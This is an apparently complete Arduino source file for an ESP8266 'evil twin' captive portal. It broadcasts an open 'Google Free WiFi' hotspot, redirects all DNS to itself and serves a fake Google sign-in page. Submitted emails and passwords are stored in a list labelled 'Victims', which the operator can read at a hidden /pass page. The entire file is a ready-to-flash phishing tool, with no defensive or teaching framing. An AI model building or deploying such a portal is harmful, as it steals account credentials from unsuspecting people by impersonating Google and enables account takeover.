// NodeMcu-ESP8266 google_fake_wifi_capative_portal
// Based on: Mrwhitehat1 https://github.com/Mrwhitehat1

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// User configuration
#define SSID_NAME "Google Free WiFi"
#define SUBTITLE "Welcome to free wifi service."
#define TITLE "Sign in"
#define BODY "Create an account to get connected to the internet."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 3 minutes for device connection.</br>Thank you."
#define PASS_TITLE "Victims"
#define CLEAR_TITLE "Cleared"

// System Settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Victims = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return
    "<br><footer><div><center><p>Copyright&#169; 2019-2020 | All rights reserved.</p></center></div></footer>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: 'Roboto', sans-serif; background-color: #f2f2f2; }"
               ".login-container { background-color: white; padding: 2em; box-shadow: 0 0 10px rgba(0, 0, 0, 0.1); border-radius: 8px; text-align: center; width: 100%; max-width: 400px; }"
               ".login-container h1 { font-size: 24px; margin: 0 0 20px 0; }"
               ".login-container input[type=text], .login-container input[type=password] { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: 1px solid #ccc; border-radius: 4px; }"
               ".login-container input[type=submit] { width: 100%; padding: 12px; margin: 8px 0; box-sizing: border-box; border: none; border-radius: 4px; background-color: #4285f4; color: white; font-size: 16px; cursor: pointer; }"
               ".login-container input[type=submit]:hover { background-color: #357ae8; }"
               "@media (max-width: 600px) { .login-container { width: 90%; } }"; // Adjusted for responsiveness
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><div class='login-container'>"
             "<h3>Google</h3>";
  return h;
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + Victims + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<form method='POST' action='/post'>"
         "<p>" + BODY + "</p>"
         "<input type='text' name='email' placeholder='Email' required><br>"
         "<input type='password' name='password' placeholder='Enter your password' required><br>"
         "<input type='submit' value='Sign in'></form>" + footer() + "</div></body></html>";
}

String posted() {
  String email = input("email");
  String password = input("password");
  Victims = "<li>Email:  <b>" + email + "</b></br>Password:  <b style=color:#ea5455;>" + password + "</b></li>" + Victims;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  Victims = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>The Victims list has been reset.</p></div><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() { 
  int count = 1;
  while (count <= 3) {   // The internal LED will blink 3 times when a password is received.
    digitalWrite(BUILTIN_LED, LOW);
    delay(400);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(400);
    count = count + 1;
  }
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
  webServer.on("/post", []() {
    webServer.send(HTTP_CODE, "text/html", posted());
    BLINK();
  });
  webServer.on("/pass", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });

  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
